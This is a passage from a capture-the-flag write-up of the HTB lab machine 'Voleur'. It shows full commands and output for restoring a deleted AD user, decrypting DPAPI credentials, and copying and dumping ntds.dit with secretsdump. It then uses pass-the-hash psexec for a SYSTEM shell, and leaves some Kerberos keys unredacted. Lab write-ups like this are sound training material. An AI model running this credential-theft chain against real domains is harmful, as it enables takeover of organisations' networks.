Modified                        : 5/13/2025 4:11:17 PM
modifyTimeStamp                 : 5/13/2025 4:11:17 PM
msDS-LastKnownRDN               : Todd Wolfe
Name                            : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133826280731790960
sAMAccountName                  : todd.wolfe
sDRightsEffective               : 0
sn                              : Wolfe
userAccountControl              : 66048
userPrincipalName               : todd.wolfe@voleur.htb
uSNChanged                      : 45088
uSNCreated                      : 12863
whenChanged                     : 5/13/2025 4:11:17 PM
whenCreated                     : 1/29/2025 1:08:06 AM


*Evil-WinRM* PS C:\programdata>

```
**Findings:** Detailed information about the deleted user was obtained, including the `lastKnownParent` OU and object GUID.


**17. Tombstone Restoration with NetExec**  
The deleted user was restored using NetExec's tombstone module.
```bash 
❯ uv run ./nxc/netexec.py ldap dc.voleur.htb -u svc_ldap -p <REDACTED> -k -M tombstone -o ACTION=query
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.54ms
Installed 1 package in 1ms
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:<REDACTED>
TOMBSTONE   dc.voleur.htb   389    DC               Found 2 deleted objects
TOMBSTONE   dc.voleur.htb   389    DC
TOMBSTONE   dc.voleur.htb   389    DC               sAMAccountName      todd.wolfe
TOMBSTONE   dc.voleur.htb   389    DC               dn      CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
TOMBSTONE   dc.voleur.htb   389    DC               ID      1c6b1deb-c372-4cbb-87b1-15031de169db
TOMBSTONE   dc.voleur.htb   389    DC               isDeleted       TRUE
TOMBSTONE   dc.voleur.htb   389    DC               lastKnownParent       OU=Second-Line Support Technicians,DC=voleur,DC=htb
TOMBSTONE   dc.voleur.htb   389    DC


❯ uv run ./nxc/netexec.py ldap dc.voleur.htb -u svc_ldap -p <REDACTED> -k -M tombstone -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db SCHEME=ldap
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.49ms
Installed 1 package in 0.89ms
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:<REDACTED>
TOMBSTONE   dc.voleur.htb   389    DC               Trying to find object with given id 1c6b1deb-c372-4cbb-87b1-15031de169db
TOMBSTONE   dc.voleur.htb   389    DC               Found 2 deleted objects, parsing results to recover necessary informations from given ID
TOMBSTONE   dc.voleur.htb   389    DC
TOMBSTONE   dc.voleur.htb   389    DC               Found target!
TOMBSTONE   dc.voleur.htb   389    DC               sAMAccountName      todd.wolfe
TOMBSTONE   dc.voleur.htb   389    DC               dn      CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
TOMBSTONE   dc.voleur.htb   389    DC               ID      1c6b1deb-c372-4cbb-87b1-15031de169db
TOMBSTONE   dc.voleur.htb   389    DC               isDeleted       TRUE
TOMBSTONE   dc.voleur.htb   389    DC               lastKnownParent       OU=Second-Line Support Technicians,DC=voleur,DC=htb
TOMBSTONE   dc.voleur.htb   389    DC
TOMBSTONE   dc.voleur.htb   389    DC               Success "CN=todd.wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb" restored

 /opt/NetExec  main !1 ?1                                      ✔  9s  root@parrot  17:10:46


```

**Findings:** The user `todd.wolfe` was successfully restored to the `Second-Line Support Technicians` OU.

**18. Credential Validation**  
The restored user's credentials from the Excel file were validated.

```bash
❯ netexec smb dc.voleur.htb -u todd.wolfe -p <REDACTED> -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:<REDACTED>
```
**Findings:** The credentials were valid for the restored user.

### Phase 7: DPAPI Credential Decryption

**19. SMB Access to Archived User Profile**  
Using the restored user's credentials, SMB access was gained to the archived user profile in the `IT` share.

**20. Navigating to Credential Directories**  
The user's archived profile was browsed to locate DPAPI-protected credential blobs.

```bash
❯ impacket-smbclient -k todd.wolfe@dc.voleur.htb
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# share
*** Unknown syntax: share
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# LS
*** Unknown syntax: LS
# ls
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 03:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:16 2025 todd.wolfe
# cd todd.wolfe
l# ls
drw-rw-rw-          0  Wed Jan 29 22:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 21:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 22:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 19:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 19:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 19:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Videos
# cd AppData\Roaming\Microsoft\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 20:13:50 2025 772275FAD58525253490A9B0039791D3
# cd ..
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Windows
# cd Protect
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 19:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# LS
*** Unknown syntax: LS
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 20:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 19:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88

#
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# LS
*** Unknown syntax: LS
# ls
cdrw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 20:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 19:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 Preferred
# cd ../
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 19:53:08 2025 SYNCHIST
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect
# cd ../
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Windows
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 20:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# Traceback (most recent call last):

❯ ls
08949382-134f-4c63-b93c-ce52efc0aa88       access_review_hash.txt        Phase-1-External-Access.md       svc_ldap
20251126214718_voleur-htb_computers.json   Access_Review.xlsx            Phase-2-Internal-Foothold.md     svc_ldap.ccache
20251126214718_voleur-htb_containers.json  initial_nmap.txt              Phase-3-Privilege-Escalation.md  svc_winrm.ccache
20251126214718_voleur-htb_domains.json     krb5tgs_lacy.miller_hash.txt  Phase-4-Lateral-Movement.md      todd.wolfe.ccache
20251126214718_voleur-htb_gpos.json        krb5tgs_winrm-hash.txt        Phase-5-Domain-Compromise.md     users.txt
20251126214718_voleur-htb_groups.json      NetExec                       RunasCs.exe                      voleur.krb
20251126214718_voleur-htb_ous.json         nmap_fullscan.txt             RunasCs_net2.exe                 voleur.krb5
20251126214718_voleur-htb_users.json       NPUsers_hashes.txt            RunasCs.zip
772275FAD58525253490A9B0039791D3           passwords.txt                 ssl
```


**21. DPAPI Master Key Decryption**  
The master key was decrypted using the user's password.
```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password <REDACTED>

❯ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password <REDACTED> 
Impacket v0.11.0 - Copyright 2023 Fortra

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01e<REDACTED> 

```
**Findings:** The decrypted master key was obtained: `<REDACTED_MASTER_KEY>`.


**22. Credential Blob Decryption**  
The decrypted master key was used to decrypt the credential blob.

```bash 

❯ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a0<REDACTED> 
Impacket v0.11.0 - Copyright 2023 Fortra

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : <REDACTED>


 /home/h/HTB/C/Voleur/03-Attack-Chains                

```

**Findings:** The decrypted credential revealed the username and password for `jeremy.combs`: `<REDACTED>`.


### Phase 8: Lateral Movement to Jeremy.Combs

**23. Kerberos Ticket for Jeremy.Combs**  
A Kerberos ticket was obtained for the `jeremy.combs` account.

```bash 
impacket-getTGT voleur.htb/jeremy.combs -dc-ip 10.129.232.130
Password:
[*] Saving ticket in jeremy.combs.ccache
$ export KRB5CCNAME=jeremy.combs.ccache
```

**24. WinRM Access as Jeremy.Combs**  
A WinRM session was established as `jeremy.combs`.
```bash 
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method
`quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-
winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents>
```


### Phase 9: SSH Private Key Discovery

**25. IT Share Exploration**  
The IT share was explored for additional files.
```bash 
*Evil-WinRM* PS C:\IT\Third-Line Support> dir
Directory: C:\IT\Third-Line Support
Mode LastWriteTime Length Name
---- ------------- ------ ----
d----- 1/30/2025 8:11 AM Backups
-a---- 1/30/2025 8:10 AM 2602 id_rsa
-a---- 1/30/2025 8:07 AM 186 Note.txt.txt
*Evil-WinRM* PS C:\IT\Third-Line Support>
```
**Findings:** An SSH private key `id_rsa` and a note file were discovered.

### Phase 10: Linux Subsystem Access

**26. SSH Access as svc_backup**  
The SSH private key was used to connect to the Linux subsystem on port 2222.

```bash
ssh -i id_rsa -p 2222 svc_backup@10.129.232.130
```

**27. Backup Directory Discovery**  
The Linux environment was explored for backup files.
```bash 
 * Starting OpenBSD Secure Shell server sshd                                           [ OK ]
svc_backup@DC:~$ ls
svc_backup@DC:~$ cd /mnt/c/IT/Third-Line Support/Backups
-bash: cd: too many arguments
svc_backup@DC:~$ cd /mnt/c/IT/
svc_backup@DC:/mnt/c/IT$ ls
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
svc_backup@DC:/mnt/c/IT$ cd 'Third-Line Support'/
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -la 'Active Directory'/
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -la registry/
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$

```
**Findings:** Backup files including `ntds.dit`, `SYSTEM`, and `SECURITY` were accessible.

### Phase 11: NTDS.dit Extraction

**28. File Transfer**  
The backup files were transferred to the attacker machine using SCP.

```bash 
❯ scp -i id_rsa -P 2222 "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" ./SECURITY

❯ scp -i id_rsa -P 2222 "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" ./SYSTEM
SYSTEM                                          100%   18MB   3.5MB/s   00:05

❯ scp -i id_rsa -P 2222 "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" ./ntds.dit
ntds.dit                      

```

### Phase 12: Domain Administrator Hash Extraction

**29. Secretsdump**  
The extracted files were used with secretsdump to retrieve domain hashes.
```bash 
❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...

```
**Findings:** The NT hash for the `Administrator` account was obtained: `<REDACTED_ADMIN_HASH>`.

### Phase 13: Domain Administrator Access

**30. PsExec as Administrator**  
The Administrator hash was used with PsExec to obtain a SYSTEM shell.

**31. Root Flag Retrieval**  
With SYSTEM access, the root flag was retrieved.
```bash 
❯ psexec.py -hashes :<REDACTED> -k 'voleur.htb/administrator@dc.voleur.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Requesting shares on dc.voleur.htb.....
[*] Found writable share ADMIN$
[*] Uploading file NboijrUH.exe
[*] Opening SVCManager on dc.voleur.htb.....
[*] Creating service mVHo on dc.voleur.htb.....
[*] Starting service mVHo.....
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Press help for extra shell commands
[-] CCache file is not found. Skipping...
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\Users\Administrator\Desktop\

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A5C3-6454

 Directory of c:\Users\Administrator\Desktop

06/05/2025  02:33 PM    <DIR>          .
06/05/2025  02:30 PM    <DIR>          ..
01/29/2025  01:12 AM             2,308 Microsoft Edge.lnk
11/26/2025  05:36 AM                34 root.txt
               2 File(s)          2,342 bytes
               2 Dir(s)   3,967,295,488 bytes free

c:\Users\Administrator\Desktop> type root.txt
<REDACTED>

c:\Users\Administrator\Desktop>

```
**Findings:** The root flag was successfully retrieved: `<REDACTED_ROOT_FLAG>`.

## Key Takeaways

- **Kerberos-Only Environments:** Disabling NTLM forces attackers to adapt their techniques, but does not prevent compromise if other vulnerabilities exist.
    
- **Document Security:** Password-protected documents are not secure; their hashes can be extracted and cracked.
    
- **Service Account Privileges:** Accounts like `svc_ldap` with `WriteSPN` can lead to targeted Kerberoasting attacks.
    
- **Deleted Object Restoration:** Tombstoned objects can be restored by users with appropriate privileges, potentially reviving dormant accounts.
    
- **DPAPI Decryption:** Stored credentials protected by DPAPI can be decrypted if the user's password is known.
    
- **Linux Subsystems:** Linux subsystems on Windows hosts can provide alternative access paths and contain sensitive backup files.
    
- **Backup Security:** Backup files containing `ntds.dit` and registry hives must be securely stored, as they allow extraction of all domain credentials.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
